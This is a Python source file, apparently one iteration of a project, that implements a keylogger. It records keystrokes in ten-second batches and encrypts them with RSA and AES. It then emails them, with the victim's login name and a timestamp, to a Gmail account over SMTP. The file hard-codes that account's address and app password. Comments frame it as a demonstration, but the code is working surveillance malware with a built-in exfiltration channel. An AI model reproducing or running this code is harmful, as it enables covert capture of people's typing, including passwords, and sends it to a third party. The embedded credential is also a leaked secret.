# Iteration 4-1, this file logs keystrokes, encrypts them, then saves to App Data
from smtplib import SMTP_SSL as SMTP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import pathlib
import sys
import keyboard
from datetime import datetime
import os
import time

# Base path used for temporary directory intialised in executable
base = pathlib.Path(getattr(sys, '_MEIPASS', pathlib.Path(__file__).parent))

def filter_key(name):
    if (len(event.name) == 1):         
        return event.name
    elif (event.name == 'space'):
        return ' '
    elif (event.name == 'enter'):
        return '\n'
    elif (event.name == 'ctrl'):
        return '[ctrl]'
    else:
        return ''

while True:
    keystrokes_list = []
    keyboard.start_recording()
    time.sleep(10)
    events = keyboard.stop_recording()
    for event in events:
        if event.event_type == keyboard.KEY_DOWN:
            keystrokes_list.append(filter_key(event.name))
            
    # If no keys were logged, do not send email and continue listening
    if (len(keystrokes_list) == 0):
        continue
    
    # ---------------- DATA ENCRYPTION ----------------------
    # The following code is taken from the PyCryptoDome docs: https://www.pycryptodome.org/src/examples#generate-an-rsa-key
    recipient_key = RSA.import_key(open(base / "public.pem").read())
    session_key = get_random_bytes(16)

    # Encrypt the session key with the public RSA key
    cipher_rsa = PKCS1_OAEP.new(recipient_key)
    enc_session_key = cipher_rsa.encrypt(session_key)

    # Encrypt the data with the AES session key
    cipher_aes = AES.new(session_key, AES.MODE_EAX)
    ciphertext, tag = cipher_aes.encrypt_and_digest("".join(keystrokes_list).encode('utf-8'))

    # Currently, this creates a file in the current directory for easy demonstration purposes,
    # in the final product, this will write a file into App Data as demonstrated in Iteration 3
    with open('encrypted_text.bin', "wb") as f:
        f.write(enc_session_key)
        f.write(cipher_aes.nonce)
        f.write(tag)
        f.write(ciphertext)
            
    # ---------------- EMAIL EXFILTRATION -------------------
    from email.mime.application import MIMEApplication
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    
    SMTPserver = 'smtp.gmail.com'
    sender =     'testemail6841@gmail.com'
    destination = ['testemail6841@gmail.com']

    USERNAME = "testemail6841@gmail.com"
    PASSWORD = "lsov clug ypdp cbjt" # App Password from gmail. This should be encrypted, but for time's sake is not. 
    
    data = "".join(keystrokes_list)
    
    dt = datetime.now().astimezone()
    timestamp = f"{dt.strftime("%a %d %b %Y, %I:%M%p")} {dt.tzname()}"
                
    msg = MIMEMultipart()
    msg['Subject']= f'{os.getlogin()}: {timestamp}'
    msg['From'] = sender # some SMTP servers will do this automatically, not 
    msg.attach(MIMEText(f"Note: In an actual implementation, only the encrypted keylogs are sent. The following plaintext representation is simply for ease of demonstration.\n\n{data}"))
    
    # In the final iteration, this file will be stored in App Data
    # For demonstration purposes, it is stored in the same directory as this file
    with open('encrypted_text.bin', 'rb') as file:
        part = MIMEApplication(
            file.read(),
            Name='encrypted_text_emailed.bin'
        )
    # After the file is closed
    part['Content-Disposition'] = 'attachment; filename="%s"' % 'encrypted_text_emailed.bin'
    msg.attach(part)

    with SMTP('smtp.gmail.com', 465) as smtp_server:
        smtp_server.login(USERNAME, PASSWORD)
        smtp_server.sendmail(sender, destination, msg.as_string())